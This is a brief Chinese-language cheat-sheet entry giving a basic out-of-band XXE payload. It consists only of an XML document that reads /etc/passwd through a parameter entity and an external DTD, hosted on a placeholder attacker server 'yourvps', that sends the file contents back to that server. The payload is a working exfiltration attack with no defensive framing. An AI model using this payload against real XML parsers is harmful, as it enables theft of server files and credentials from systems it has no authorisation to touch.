## 带外xxe的基础payload

payload
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">
%dtd; %all;
]>
<value>&send;</value>
```
xxe.xml
```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://yourvps/%file;'>">
```